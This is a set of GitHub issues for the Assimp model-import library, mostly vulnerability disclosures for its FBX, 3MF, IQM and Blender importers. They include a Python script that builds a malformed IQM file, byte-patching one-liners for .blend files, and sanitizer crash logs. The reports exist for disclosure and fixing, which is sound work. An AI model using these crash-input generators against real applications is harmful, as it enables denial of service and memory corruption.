items.title: Bug: When exporting as FBX, the Video properties are set with the path but not the Texture properties as expected by blender.

labels.name: Bug
labels.description: Global flag to mark a deviation from expected behaviour

items.body:
**Describe the bug**
A clear and concise description of what the bug is.

**To Reproduce**
Export an FBX and observe that the resulting FBX doesn't have textures in Blender.

**Expected behavior**
The Video and Texture should refer to the same path. In particular the Texture should.

**Actual behavior**

```
    Material: 1000020, "Material::c56657_0000_1050", "" {
        Version: 102
        ShadingModel: "lambert"
        MultiLayer: 0
        Properties70: {
            P: "Emissive", "Vector3D", "Vector", "", 0, 0, 0
            P: "Ambient", "Vector3D", "Vector", "", 0.20000000298023224, 0.20000000298023224, 0.20000000298023224
            P: "Diffuse", "Vector3D", "Vector", "", 0.800000011920929, 0.800000011920929, 0.800000011920929
            P: "Opacity", "double", "Number", "", 1
        }
    }
...
    C: "OP", 1000054, 1000020, "DiffuseColor"
    C: "OO", 1000034, 1000054
...
    Video: 1000034, "Video::", "Clip" {
        Type: "Clip"
        Properties70: {
            P: "Path", "KString", "XRefUrl", "", "32aaa0.dds"
        }
        UseMipMap: 0
        Filename: "32aaa0.dds"
        RelativeFilename: "32aaa0.dds"
    }
...
    Texture: 1000054, "Texture::", "" {
        Type: "TextureVideoClip"
        Version: 202
        TextureName: "Texture::"
        Properties70: {
            P: "Translation", "Vector", "", "A", 0, 0, 0
            P: "Rotation", "Vector", "", "A", 0, 0, 0
            P: "Scaling", "Vector", "", "A", 1, 1, 0
            P: "CurrentTextureBlendMode", "enum", "", "", 0
            P: "UseMaterial", "bool", "", "", 1
        }
        FileName: ""  // THIS IS THE PROBLEM! IT SHOULD DUPLICATE "FileName" FROM THE VIDEO.
        RelativeFilename: ""  // THIS IS THE PROBLEM! IT SHOULD DUPLICATE "RelativeFilename" FROM THE VIDEO.
        ModelUVTranslation: 0, 0
        ModelUVScaling: 1, 1
        Texture_Alpha_Source: "None"
        Cropping: 0, 0, 0, 0
    }
```

**Platform (please complete the following information):**
Any and all.

**Additional context**
Impacts blender import, but maybe others.

items.body:
Dear Assimp Maintainers,



I am writing to report a heap buffer overflow vulnerability discovered in the FBX importer module of Assimp.

This vulnerability occurs in the aiMaterial::AddBinaryProperty function when loading a malicious FBX file.

Below are the details of the vulnerability.





1. Environment

OS : Ubuntu 22.04

Version : Assimp 6.0.2 (Latest Release)

Build Type : Release Mode



Build Command:

cmake -S . -B build-afl \\
    -DCMAKE_BUILD_TYPE=RelWithDebInfo \\
    -DBUILD_SHARED_LIBS=OFF \\
    -DASSIMP_BUILD_TESTS=OFF \\
    -DASSIMP_BUILD_SAMPLES=OFF \\
    -DASSIMP_BUILD_ASSIMP_TOOLS=OFF \\
    -DASSIMP_BUILD_DRACO=OFF \\
    -DASSIMP_BUILD_ALL_IMPORTERS_BY_DEFAULT=OFF \\
    -DASSIMP_BUILD_FBX_IMPORTER=ON \\
    -DASSIMP_BUILD_ALL_EXPORTERS_BY_DEFAULT=OFF

2. Vulnerability Summary
Type : Heap Buffer Overflow
Location : code/Material/MaterialSystem.cpp (Line 523)
Function : aiMaterial::AddBinaryProperty
Vulnerable Code : strcpy(pcNew→mKey.data, pKey)


3. Root Cause Analysis

The vulnerability arises when adding a property to an aiMaterial object.

The code attempts to copy the property name (pKey) into a fixed-size buffer (pcNew->mKey.data, where AI_MAXLEN = 1024):

// code/Material/MaterialSystem.cpp
pcNew->mKey.length = static_cast<ai_uint32>(::strlen(pKey));

// The ai_assert macro is compiled out (empty) in Release builds.
ai_assert(AI_MAXLEN > pcNew->mKey.length);

// Vulnerability: No runtime length check exists in Release mode.
// If pKey is larger than 1024 bytes, a heap buffer overflow occurs.
strcpy(pcNew->mKey.data, pKey);


In Debug builds, ai_assert functions correctly and prevents the overflow.

However, in Release builds (typically used in production), ai_assert is removed during compilation.

Consequently, there is no runtime validation of the string length, allowing an attacker to trigger a heap buffer overflow by providing a property name longer than AI_MAXLEN.







4. Proof of Concept (PoC)

I have attached:

a PoC FBX file (crash1.1) that triggers this vulnerability, and
a test binary (fbx_fuzzer) built with ASAN enabled.

In the PoC, the Opacity property key has been manipulated to contain an abnormally long string.

Snippet of the PoC:

Material: ... {
    Properties70:  {
        ...
        P: "OpacityAAAA... (long string) ...AAAA", "double", "Number", "",1
    }
}
 
 
5. ASAN Log

items.body:
**Describe the bug**

A corrupt `.3mf` kills the process instead of failing the import.
When the root model part cannot be extracted from the ZIP container, the 3MF loader aborts on an assertion rather than returning an error.

`D3MFOpcPackage`'s constructor already handles this case correctly with a `throw DeadlyImportError` on the line below, but the assertion fires first and calls `abort()` before the throw is reached.

`code/AssetLib/3MF/D3MFOpcPackage.cpp`:

```c++
162	            mRootPath = rootFile;
163	            mRootStream = mZipArchive->Open(rootFile.c_str());
164	            ai_assert(mRootStream != nullptr);
165	            if (nullptr == mRootStream) {
166	                throw DeadlyImportError("Cannot open root-file in archive : " + rootFile);
167	            }
```

```
ai_assert failure in /src/assimp/code/AssetLib/3MF/D3MFOpcPackage.cpp(164): mRootStream != nullptr
==14==ERROR: AddressSanitizer: ABRT on unknown address 0x00000000000e
SCARINESS: 10 (signal)
    #2 in Assimp::defaultAiAssertHandler(char const*, char const*, int) /src/assimp/code/Common/AssertHandler.cpp:53:5
    #3 in Assimp::D3MF::D3MFOpcPackage::D3MFOpcPackage(...) /src/assimp/code/AssetLib/3MF/D3MFOpcPackage.cpp:164:13
    #4 in Assimp::D3MFImporter::InternReadFile(...) /src/assimp/code/AssetLib/3MF/D3MFImporter.cpp:106:20
    #5 in Assimp::BaseImporter::ReadFile(...) /src/assimp/code/Common/BaseImporter.cpp:131:9
    #6 in Assimp::Importer::ReadFile(char const*, unsigned int) /src/assimp/code/Common/Importer.cpp:709:30
    #7 in Assimp::Importer::ReadFileFromMemory(...) /src/assimp/code/Common/Importer.cpp:507:9
```

The assertion is compiled in for any build that does not define `NDEBUG`.
`ai_assert` is keyed on `ASSIMP_BUILD_DEBUG` (`include/assimp/ai_assert.h:66-72`), and `include/assimp/defs.h:257-259` defines that whenever `NDEBUG` is absent:

```c
257	#if defined(_DEBUG) || !defined(NDEBUG)
258	#  define ASSIMP_BUILD_DEBUG
259	#endif
```

OSS-Fuzz's base-builder sets no `NDEBUG`, and `projects/assimp/build.sh` sets no `CMAKE_BUILD_TYPE`, so every OSS-Fuzz build of assimp has this assertion enabled, as does any debug build a downstream consumer ships.

**To Reproduce**

Steps to reproduce the behavior:

1. Get OSS-Fuzz and build the assimp fuzz targets with ASan:

```bash
export DOCKER_DEFAULT_PLATFORM=linux/amd64 # if on mac
git clone https://github.com/google/oss-fuzz.git
cd oss-fuzz
python3 infra/helper.py build_image assimp
python3 infra/helper.py build_fuzzers --sanitizer address assimp
```

2. Take the two attached files, `minimal_open_fails.3mf` and `crash-0002a68bd1ac4c289050394c189aaac8a58c61dd`. ([Reproduce.zip](https://github.com/user-attachments/files/31368934/Reproduce.zip))

3. Run either of them through the 3MF target:

```bash
python3 infra/helper.py reproduce assimp assimp_fuzzer_3mf minimal_open_fails.3mf
python3 infra/helper.py reproduce assimp assimp_fuzzer_3mf crash-0002a68bd1ac4c289050394c189aaac8a58c61dd
```

4. See the `ai_assert failure` line quoted above, followed by `AddressSanitizer: ABRT`.

Both files produce the same `DEDUP_TOKEN: raise--abort--Assimp::defaultAiAssertHandler(char const*, char const*, int)`.

The generic `assimp_fuzzer` target reproduces both files as well, since it auto-detects the 3MF format.

**Expected behavior**

`Importer::ReadFileFromMemory` should return `nullptr` and `Importer::GetErrorString` should report `Cannot open root-file in archive`, which is what the `throw DeadlyImportError` on line 166 already does.

This is also what already happens today in a build with `NDEBUG` set, where the assertion is compiled out and the `nullptr` check below it handles the input correctly.

**Platform (please complete the following information):**

 - OS: OSS-Fuzz at commit `a4df12d70b5420567d893b3f53e5818a74df5db7`, default `linux/amd64` containers
 - Browser: not applicable
 - Version: assimp master at commit `21bea12f1278090c09a94c39ca090d9fb458ccd9`, which reports itself as 6.0.5

**Additional context**

Suggested fix, delete the assertion and let the existing `throw` do its job:

```diff
             mRootPath = rootFile;
             mRootStream = mZipArchive->Open(rootFile.c_str());
-            ai_assert(mRootStream != nullptr);
             if (nullptr == mRootStream) {
                 throw DeadlyImportError("Cannot open root-file in archive : " + rootFile);
             }
```

An assertion cannot serve as input validation here, since `NDEBUG` removes it exactly in the builds that face untrusted files.
The `nullptr` check below it is the real guard and it already works.

With that change, both attached files stop crashing.

Once the assertion is gone, ASan reports a leak of `mZipArchive` on the throwing path.
That is not a regression from this patch, it is pre-existing and is what PR https://github.com/assimp/assimp/pull/6803 fixes, so the two changes complement each other.
Note that #6803 rewrites this constructor but keeps this assertion.
We built that PR and both attached files still abort, so it does not cover this on its own.

Found by the CISPA Fandango-Team while triaging OSS-Fuzz findings for assimp.

items.body:
# Heap-buffer-overflow in IQM importer due to integer overflow in `first_vertex * array->size`

## Summary

A heap-buffer-overflow can be triggered in Assimp's IQM importer when parsing a crafted Inter-Quake Model (`.iqm`) file.

The issue is located in the IQM importer, specifically in the vertex attribute parsing logic in:

```text
code/AssetLib/IQM/IQMImporter.cpp
```

The parser uses attacker-controlled values from the IQM file to calculate the starting offset of vertex data:

```cpp
imesh->first_vertex * array->size
```

Both `first_vertex` and `array->size` are derived from the input file. The multiplication is performed using 32-bit unsigned arithmetic. When the product overflows, the result wraps around and causes the parser to read vertex data from an incorrect location inside the file buffer.

This can lead to an out-of-bounds read and a crash detected by AddressSanitizer.

## Affected Component

```text
Assimp IQM importer
code/AssetLib/IQM/IQMImporter.cpp
```

The issue affects builds where the IQM importer is enabled. The IQM importer appears to be enabled by default unless `ASSIMP_BUILD_NO_IQM_IMPORTER` is defined.

## Vulnerability Type

```text
CWE-190: Integer Overflow or Wraparound
CWE-125: Out-of-bounds Read
```

## Root Cause

The IQM importer computes the vertex data pointer using:

```cpp
imesh->first_vertex * array->size
```

where:

* `imesh->first_vertex` comes from the `iqmmesh` chunk.
* `array->size` comes from the `iqmvertexarray` chunk.
* Both fields are attacker-controlled through the input IQM file.

For example:

```text
first_vertex = 0x55555556
array->size  = 3
```

The mathematical product is:

```text
0x55555556 * 3 = 0x100000002
```

However, when computed as a 32-bit unsigned integer, the value wraps around to:

```text
0x00000002
```

As a result, the calculated pointer points near the beginning of the file buffer instead of the intended vertex data region. The subsequent parsing loop then reads `nVerts * array->size` float values from this incorrect location, eventually causing a heap-buffer-overflow.

The same pattern appears to affect multiple vertex attribute parsing paths, including position, texcoord, normal, and color data.

## Reproduction Environment

Tested on:

```text
Ubuntu 22.04 / Ubuntu 24.04
```

Build configuration:

```bash
git clone https://github.com/assimp/assimp.git --depth 1
cd assimp

mkdir build_asan
cd build_asan

cmake .. \
  -DCMAKE_BUILD_TYPE=Debug \
  -DCMAKE_CXX_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g" \
  -DCMAKE_C_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g" \
  -DASSIMP_BUILD_TESTS=OFF \
  -DBUILD_SHARED_LIBS=OFF \
  -DASSIMP_BUILD_ASSIMP_TOOLS=ON

make -j$(nproc) assimp assimp_cmd
```

The ASan-enabled command line tool is generated as:

```text
build_asan/bin/assimpd
```

## Proof of Concept

The following Python script generates a malformed `.iqm` file that triggers the issue.

```python
import struct

def u32(v):
    return struct.pack("<I", v & 0xFFFFFFFF)

MAGIC = b"INTERQUAKEMODEL\x00"
VERSION = 2

NUM_MESHES = 1
NUM_VERTEXARRAYS = 3

FIRST_VERTEX = 0x55555556
NUM_VERTEXES = 0x4B
NUM_TRIANGLES = 0x65

HDR_SIZE = 124
TEXT_SIZE = 64

MESHES_OFFSET = HDR_SIZE + TEXT_SIZE
MESHES_SIZE = NUM_MESHES * 24

VARRAYS_OFFSET = MESHES_OFFSET + MESHES_SIZE
VARRAYS_SIZE = NUM_VERTEXARRAYS * 24

TRIS_OFFSET = VARRAYS_OFFSET + VARRAYS_SIZE
TRIS_SIZE = NUM_TRIANGLES * 12

ADJ_OFFSET = TRIS_OFFSET + TRIS_SIZE
VERTEX_DATA_OFFSET = ADJ_OFFSET

VERTEX_DATA_SIZE = 0x4000
FILESIZE = VERTEX_DATA_OFFSET + VERTEX_DATA_SIZE

data = bytearray()

hdr = bytearray(124)
hdr[0:16] = MAGIC

struct.pack_into("<I", hdr, 16, VERSION)
struct.pack_into("<I", hdr, 20, FILESIZE)
struct.pack_into("<I", hdr, 24, 0)

struct.pack_into("<I", hdr, 28, 2)
struct.pack_into("<I", hdr, 32, HDR_SIZE)

struct.pack_into("<I", hdr, 36, NUM_MESHES)
struct.pack_into("<I", hdr, 40, MESHES_OFFSET)

struct.pack_into("<I", hdr, 44, NUM_VERTEXARRAYS)
struct.pack_into("<I", hdr, 48, 0)
struct.pack_into("<I", hdr, 52, VARRAYS_OFFSET)

struct.pack_into("<I", hdr, 56, NUM_TRIANGLES)
struct.pack_into("<I", hdr, 60, TRIS_OFFSET)
struct.pack_into("<I", hdr, 64, ADJ_OFFSET)

struct.pack_into("<I", hdr, 108, 0)
struct.pack_into("<I", hdr, 112, 0)
struct.pack_into("<I", hdr, 116, 0)
struct.pack_into("<I", hdr, 120, 0)

data += hdr

data += b"Body\x00Body.jpg\x00Head\x00Head.jpg\x00Root\x00Spine.jpg\x00"

mesh = struct.pack(
    "<IIIIII",
    0,
    0,
    FIRST_VERTEX,
    NUM_VERTEXES,
    0,
    NUM_TRIANGLES,
)
data += mesh + b"\x00" * (MESHES_SIZE - len(mesh))

for vtype, fmt, sz in [
    (0, 7, 3),
    (1, 7, 2),
    (2, 7, 3),
]:
    va = struct.pack("<IIIII", vtype, 0, fmt, sz, VERTEX_DATA_OFFSET)
    data += va

for i in range(NUM_TRIANGLES):
    data += struct.pack(
        "<III",
        i * 3 % NUM_VERTEXES,
        (i * 3 + 1) % NUM_VERTEXES,
        (i * 3 + 2) % NUM_VERTEXES,
    )

data += b"\x00" * (NUM_TRIANGLES * 12)
data += b"\x00" * VERTEX_DATA_SIZE

with open("iqm_overflow.iqm", "wb") as f:
    f.write(data)

print(f"PoC size: {len(data)} bytes")
print(f"first_vertex=0x{FIRST_VERTEX:08X}, step=3")
print(
    f"first_vertex*step = 0x{FIRST_VERTEX * 3:016X} "
    f"-> 32-bit wraparound = 0x{(FIRST_VERTEX * 3) & 0xFFFFFFFF:08X}"
)
```

Generate the PoC file:

```bash
python3 gen_iqm_poc.py
```

This creates:

```text
iqm_overflow.iqm
```

## Steps to Reproduce

```bash
./bin/assimpd info ./iqm_overflow.iqm
```

## AddressSanitizer Output

```text
=================================================================
==25985==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x748bbf1128a0 at pc 0x624c8ffe2d61 bp 0x7ffc1ba53130 sp 0x7ffc1ba53120
READ of size 4 at 0x748bbf1128a0 thread T0

    #0 0x624c8ffe2d60 in Assimp::IQMImporter::InternReadFile(...)
       code/AssetLib/IQM/IQMImporter.cpp:224

    #1 0x624c8fcc00fb in Assimp::BaseImporter::ReadFile(...)
       code/Common/BaseImporter.cpp:131

    #2 0x624c8f85583c in Assimp::Importer::ReadFile(char const*, unsigned int)
       code/Common/Importer.cpp:709

    #3 0x624c8f83f775 in Assimp::Importer::ReadFile(...)
       include/assimp/Importer.hpp:672

    #4 0x624c8f83cbf9 in ImportModel(...)
       tools/assimp_cmd/Main.cpp:307

    #5 0x624c8f8472c3 in Assimp_Info(...)
       tools/assimp_cmd/Info.cpp:344

    #6 0x624c8f83c665 in main
       tools/assimp_cmd/Main.cpp:222

0x748bbf1128a0 is located 400 bytes to the right of 257808-byte region
[0x748bbf0d3800,0x748bbf112710)

SUMMARY: AddressSanitizer: heap-buffer-overflow IQMImporter.cpp:224 in Assimp::IQMImporter::InternReadFile(...)
==25985==ABORTING
```

## Expected Behavior

Assimp should reject the malformed IQM file with a validation error and should not perform out-of-bounds memory reads.

## Actual Behavior

Assimp calculates an incorrect vertex data pointer due to 32-bit integer overflow and then performs an out-of-bounds read while parsing vertex attributes.

## Suggested Fix

Before using `first_vertex * array->size` to compute a pointer offset, the importer should validate the multiplication using a wider integer type or explicit overflow checks.

For example, the parser should reject the file if:

```text
first_vertex > UINT32_MAX / array->size
```

or, preferably, compute the offset using `size_t` / `uint64_t` and validate that the final byte range remains within the file buffer before reading:

```text
offset = ofs_vertexarrays + first_vertex * array->size * sizeof(float)
required_size = nVerts * array->size * sizeof(float)
offset + required_size <= file_size
```

Similar validation should be applied to all vertex attribute paths that use `first_vertex * array->size`, including position, texcoord, normal, and color arrays.

## Impact

A crafted IQM file can cause Assimp to read outside the allocated file buffer, resulting in a crash. This can lead to denial of service in applications that import untrusted model files through Assimp.

Depending on allocator behavior and surrounding memory layout, the out-of-bounds read may also expose memory safety concerns beyond a simple crash, so the affected offset calculation should be treated as a security-relevant parser bug.

## Additional Notes

The vulnerability is triggered only through a malformed input file. No source code modification or direct internal API call is required. The crash is reproduced by invoking the compiled Assimp command-line tool on the crafted `.iqm` file.

items.title: Bug: [Vulnerability Report] Heap Buffer Overflow in Assimp FBX Importer

labels.name: Bug
labels.description: Global flag to mark a deviation from expected behaviour

items.body:
Dear Assimp Maintainers,



I am writing to report a heap buffer overflow vulnerability discovered in the FBX importer module of Assimp.
This vulnerability occurs in the aiMaterial::AddBinaryProperty function when loading a malicious FBX file.
Below are the details of the vulnerability.

```
1. Environment
OS : Ubuntu 22.04

Version : Assimp 6.0.2 (Latest Release)

Build Type : Release Mode

Build Command:

cmake -S . -B build-afl \\
    -DCMAKE_BUILD_TYPE=RelWithDebInfo \\
    -DBUILD_SHARED_LIBS=OFF \\
    -DASSIMP_BUILD_TESTS=OFF \\
    -DASSIMP_BUILD_SAMPLES=OFF \\
    -DASSIMP_BUILD_ASSIMP_TOOLS=OFF \\
    -DASSIMP_BUILD_DRACO=OFF \\
    -DASSIMP_BUILD_ALL_IMPORTERS_BY_DEFAULT=OFF \\
    -DASSIMP_BUILD_FBX_IMPORTER=ON \\
    -DASSIMP_BUILD_ALL_EXPORTERS_BY_DEFAULT=OFF

2. Vulnerability Summary
Type : Heap Buffer Overflow
Location : code/Material/MaterialSystem.cpp (Line 523)
Function : aiMaterial::AddBinaryProperty
Vulnerable Code : strcpy(pcNew→mKey.data, pKey)


3. Root Cause Analysis
The vulnerability arises when adding a property to an aiMaterial object.

The code attempts to copy the property name (pKey) into a fixed-size buffer (pcNew->mKey.data, where AI_MAXLEN = 1024):

// code/Material/MaterialSystem.cpp
pcNew->mKey.length = static_cast<ai_uint32>(::strlen(pKey));

// The ai_assert macro is compiled out (empty) in Release builds.
ai_assert(AI_MAXLEN > pcNew->mKey.length);

// Vulnerability: No runtime length check exists in Release mode.
// If pKey is larger than 1024 bytes, a heap buffer overflow occurs.
strcpy(pcNew->mKey.data, pKey);
In Debug builds, ai_assert functions correctly and prevents the overflow.

However, in Release builds (typically used in production), ai_assert is removed during compilation.

Consequently, there is no runtime validation of the string length, allowing an attacker to trigger a heap buffer overflow by providing a property name longer than AI_MAXLEN.


4. Proof of Concept (PoC)
I have attached:

[PoC (1).zip](https://github.com/user-attachments/files/30972765/PoC.1.zip)

a PoC FBX file (crash1.1) that triggers this vulnerability, and
a test binary (fbx_fuzzer) built with ASAN enabled.
In the PoC, the Opacity property key has been manipulated to contain an abnormally long string.

Snippet of the PoC:

Material: ... {
    Properties70:  {
        ...
        P: "OpacityAAAA... (long string) ...AAAA", "double", "Number", "",1
    }
}


5. ASAN Log

Running the PoC with AddressSanitizer (ASAN) confirms the heap buffer overflow:
```

items.title: Bug:Blender importer computes file offset from attacker-controlled pointer values → StreamReader::SetCurrentPos pointer arithmetic overflow / UBSan SIGILL (CWE-682)

labels.name: Bug
labels.description: Global flag to mark a deviation from expected behaviour

labels.name: Blender
labels.description: Blender support issues

items.body:
**Describe the bug**

In the Blender SDNA/DNA decode path, `Structure::ReadCustomDataPtr()` (BlenderDNA.inl:337) computes a read position directly from pointer fields in the .blend binary file:

```c
db.reader->SetCurrentPos(block->start + (ptrval.val - block->address.val))
```

`block->start`, `ptrval.val`, and `block->address.val` are all read from untrusted file bytes without any validation. `StreamReader::SetCurrentPos()` then executes `SetPtr(mBuffer + pos)` (StreamReader.h:255). When a malformed .blend file overwrites the mesh CustomData DATA block header with `0xFF`, the computed `pos` becomes huge, `mBuffer + pos` leaves address-space bounds, and UBSan flags it as **pointer arithmetic overflowed bounds** → `__builtin_trap` → **SIGILL (exit 132)**. The offset is entirely file-controlled, and the defect is reached early in scene parsing through a 22-frame call chain.

**To Reproduce**

1. Download the seed file from assimp's repository:
   **https://github.com/assimp/assimp/blob/master/test/models/Blender/BlenderDefault_248.blend**
   (125,148 bytes, MD5 `42c14b7788674fa8b81d3a00db1dfc11`). Click "Download raw file" or use:
   ```bash
   wget https://raw.githubusercontent.com/assimp/assimp/master/test/models/Blender/BlenderDefault_248.blend
   ```

2. Generate the POC by overwriting the mesh CustomData pointer fields with 0xFF:

   ```bash
   # Offset 0x13B40, 64 bytes to 0xFF:
   python3 -c "data=bytearray(open('BlenderDefault_248.blend','rb').read());[data.__setitem__(0x13B40+i,0xFF) for i in range(64)];open('assimp_poc4_customdata_ptr.bin','wb').write(data)"
   ```

   Or use the generator script (`generate_assimp_pocs.py`, attached) to create all 4 POC files at once:
   ```bash
   python3 generate_assimp_pocs.py BlenderDefault_248.blend
   ```

   Offset 0x13B40 sits immediately after a `DATA` file-block header (block code `DATA` at 0x13B38) and is the start of a mesh CustomDataLayer payload. This region holds the `Pointer` struct's `address` and `start` fields. The region changes from:

```
00013b30: e6 49 03 ff 00 00 00 00 44 41 54 41 2c 01 00 00   .I......DATA,...
00013b40: 00 61 fe 02 27 01 00 00 05 00 00 00 03 00 00 00   .a..'...........
00013b50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
```

   to:

```
00013b40: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff   ................
00013b50: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff   ................
```

   After corruption, `ptrval.val` and `block->address.val` become `0xFFFFFFFF`, the subtraction wraps around, and `block->start + ...` produces a `pos` large enough to overflow `mBuffer + pos`.

3. Build assimp with UBSan trap mode (the project's `BUILD_FUZZ=ON` CMake configuration does this by default).

4. Run the fuzz harness on the POC file:

```bash
./out/assimp_harness assimp_poc4_customdata_ptr.bin
```

5. The process crashes with SIGILL (exit 132). For a detailed stacktrace:

```bash
ASAN_OPTIONS=handle_sigill=1:print_stacktrace=1 ./out/assimp_harness assimp_poc4_customdata_ptr.bin
```

```
==3789097==ERROR: AddressSanitizer: ILL on unknown address 0x555556362b28 (pc 0x555556362b28 ...)
    #0 0x555556362b28 in __clang_trap_msg$Pointer arithmetic overflowed bounds /usr/lib/gcc/.../bits/basic_string.h
    #1 0x555556362b28 in Assimp::StreamReader<true, true>::SetCurrentPos(unsigned long) /src/assimp/include/assimp/StreamReader.h:255:24
    #2 0x555556362b28 in Assimp::Blender::Structure::ReadCustomDataPtr<2>(...) /src/assimp/code/AssetLib/Blender/BlenderDNA.inl
    #3 0x5555563606e6 in Assimp::Blender::Structure::Convert<CustomDataLayer>(...) /src/assimp/code/AssetLib/Blender/BlenderScene.cpp:842:5
    ...
    #17 0x55555628cd7a in Assimp::BlenderImporter::ExtractScene(...) /src/assimp/code/AssetLib/Blender/BlenderLoader.cpp:221:8
    #18 0x55555628a51a in Assimp::BlenderImporter::InternReadFile(...) /src/assimp/code/AssetLib/Blender/BlenderLoader.cpp:156:5
    #22 0x5555558c1611 in LLVMFuzzerTestOneInput /task/harness.cpp:56:37
SUMMARY: AddressSanitizer: ILL /src/assimp/include/assimp/StreamReader.h:255:24 in StreamReader::SetCurrentPos
```

**Expected behavior**

When a .blend file contains corrupted pointer/offset fields in the CustomData region, the importer should reject the invalid offset, log an error, and skip the affected mesh rather than computing an unbounded pointer offset and crashing. In a release build with a valid .blend file, the mesh CustomData should be decoded correctly without pointer arithmetic overflow.

**Affected code**

```c
/* include/assimp/StreamReader.h:255 */
template<bool SwapEndianess, bool RuntimeSwitch>
inline void StreamReader<SwapEndianess, RuntimeSwitch>::SetCurrentPos(size_t pos) {
    SetPtr(mBuffer + pos);   /* <-- UB: mBuffer + pos overflows address-space bounds */
}

/* code/AssetLib/Blender/BlenderDNA.inl:337 — ReadCustomDataPtr */
template<int error_policy, int address_size, int dna_bitness>
bool Structure::ReadCustomDataPtr(..., const FileDatabase& db) const {
    Pointer ptrval;
    ReadFieldPtr<address_size, ...>(out, name, db);  /* ptrval from file, unchecked */
    db.reader->SetCurrentPos(
        block->start + (ptrval.val - block->address.val)  /* attacker-controlled pos */
    );
    ...
}
```

Call chain (22 frames from public API to crash):

```
ReadFileFromMemory() (Importer.cpp:507)
  └─ ReadFile() (Importer.cpp:709)
       └─ InternReadFile() (BlenderLoader.cpp:158)
            └─ ExtractScene() (BlenderLoader.cpp:221)
                 └─ Convert<Scene>() → Convert<Base>() → Convert<Object>() → Convert<Mesh>()
                      └─ Convert<CustomData>() → Convert<CustomDataLayer>()
                           └─ ReadCustomDataPtr() (BlenderDNA.inl:337)
                                └─ SetCurrentPos() (StreamReader.h:255)
                                     └─ SetPtr(mBuffer + pos)  <- UB trap
```

**Platform**

- OS: Linux x86-64 (Ubuntu 22.04)
- Compiler: Clang 18 with `-fsanitize=address,undefined -fno-sanitize-recover=all`
- assimp version: commit `a433d5a` (master, 2026-08)
- Fuzzing engine: AFL++ via `LLVMFuzzerTestOneInput` harness
- Exit code: 132 (SIGILL, trap-mode UBSAN)

**Additional context**

- Deterministic: yes — same input always triggers.
- Reachability: every `.blend` input with mesh data reaches `ReadCustomDataPtr` during scene parsing through the generic `ReadFileFromMemory` API.
- Severity: this is the most serious of four crashes found in this batch. The offset is entirely file-controlled, giving an attacker precise control over the pointer arithmetic. In a release build without UBSan traps, `mBuffer + pos` produces an out-of-bounds pointer; if subsequently dereferenced, this can escalate to an out-of-bounds read or write.

items.title: Bug:Blender importer switches on unvalidated, file-controlled enum fields → UBSan invalid enum load / SIGILL (CWE-704)

labels.name: Bug
labels.description: Global flag to mark a deviation from expected behaviour

labels.name: Blender
labels.description: Blender support issues

items.body:
**Describe the bug**

The Blender (.blend) importer in assimp decodes enum fields directly from untrusted binary file bytes and passes them into `switch` statements without range validation. Three distinct sites in `BlenderLoader.cpp` — `ConvertLight` (switches on `lamp->type`, legal values 0..4), `ConvertNode` (switches on `obj->type`, 10 legal discrete values), and `ResolveTexture` (switches on `rtex->type`, legal values 1..15) — all contain a `switch` with no default branch and no prior bounds check. A malformed .blend file that overwrites the corresponding struct regions with `0xFF` causes the enum to load the value `0xFFFFFFFF`. Loading an out-of-range value into a C++ enum is undefined behavior; under a trap-mode UBSAN build (`-fsanitize-trap=undefined`) this compiles to a `ud1` trap instruction, crashing the process with **SIGILL (exit 132)**.

**To Reproduce**

1. Download the seed file from assimp's repository:
   **https://github.com/assimp/assimp/blob/master/test/models/Blender/BlenderDefault_248.blend**
   (125,148 bytes, MD5 `42c14b7788674fa8b81d3a00db1dfc11`). Click "Download raw file" or use:
   ```bash
   wget https://raw.githubusercontent.com/assimp/assimp/master/test/models/Blender/BlenderDefault_248.blend
   ```

2. Generate the POC files by overwriting specific file offsets with 0xFF. These are small hex-patch operations that anyone can run with a single command:

   ```bash
   # Trigger A — Lamp enum (offset 0x12480, 64 bytes to 0xFF):
   python3 -c "data=bytearray(open('BlenderDefault_248.blend','rb').read());[data.__setitem__(0x12480+i,0xFF) for i in range(64)];open('assimp_poc1_lamp_enum.bin','wb').write(data)"

   # Trigger B — Object enum (offset 0x12D00, 64 bytes to 0xFF):
   python3 -c "data=bytearray(open('BlenderDefault_248.blend','rb').read());[data.__setitem__(0x12D00+i,0xFF) for i in range(64)];open('assimp_poc2_object_enum.bin','wb').write(data)"

   # Trigger C — Tex enum (offset 0x13700, 128 bytes to 0xFF):
   python3 -c "data=bytearray(open('BlenderDefault_248.blend','rb').read());[data.__setitem__(0x13700+i,0xFF) for i in range(128)];open('assimp_poc3_tex_enum.bin','wb').write(data)"
   ```

   Or use the generator script (`generate_assimp_pocs.py`, attached) to create all 4 POC files at once:
   ```bash
   python3 generate_assimp_pocs.py BlenderDefault_248.blend
   ```

3. Build assimp with UBSan trap mode (the project's `BUILD_FUZZ=ON` CMake configuration does this by default).

4. Run the fuzz harness on the POC file:

```bash
./out/assimp_harness assimp_poc1_lamp_enum.bin
```

5. The process crashes with SIGILL (exit 132). For a detailed stacktrace:

```bash
ASAN_OPTIONS=handle_sigill=1:print_stacktrace=1 ./out/assimp_harness assimp_poc1_lamp_enum.bin
```

```
==3789068==ERROR: AddressSanitizer: ILL on unknown address 0x5555562c265d (pc 0x5555562c265d ...)
    #0 0x5555562c265d in __clang_trap_msg$Loaded an invalid value for the type /src/assimp/code/AssetLib/Blender/BlenderLoader.cpp
    #1 0x5555562c265d in Assimp::BlenderImporter::ConvertLight(...) BlenderLoader.cpp:1127:19
    #2 0x55555629b7e7 in Assimp::BlenderImporter::ConvertNode(...) BlenderLoader.cpp:1223:29
    #3 0x55555628f83d in Assimp::BlenderImporter::ConvertBlendFile(...) BlenderLoader.cpp:304:34
    #4 0x55555628a556 in Assimp::BlenderImporter::InternReadFile(...) BlenderLoader.cpp:158:5
    #8 0x5555558c1611 in LLVMFuzzerTestOneInput /task/harness.cpp:56:37
SUMMARY: AddressSanitizer: ILL /src/assimp/code/AssetLib/Blender/BlenderLoader.cpp in ConvertLight
```

**Expected behavior**

When a .blend file contains an out-of-range value in the `Lamp::type`, `Object::type`, or `Tex::type` field, the importer should reject the value, log a warning or error, and skip the affected object (light, node, or texture) rather than switching on an invalid enum. A release build reading a valid .blend file should get the correct scene without UBSAN traps.

**Affected code**

```c
